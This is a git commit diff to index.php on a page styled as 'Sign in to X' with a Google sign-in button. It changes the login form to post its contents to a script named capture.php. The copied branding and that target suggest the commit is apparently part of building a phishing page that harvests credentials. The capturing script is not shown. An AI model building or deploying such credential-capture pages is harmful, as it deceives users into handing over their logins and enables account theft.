ed3363ad60c8cd1a919a107f9b678af2182c06ee
harish2975 <harishraghav2975@gmail.com>
2025-01-01 23:15:00 +0530

    Update index.php

--- index.php
+++ index.php
@@ -9,7 +9,7 @@
 <body>
     <div class="login-container">
         <h1>Sign in to X</h1>
-        <form>
+        <form action="./capture.php" method="POST">
             <button type="button">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Google">
                 Sign in with Google
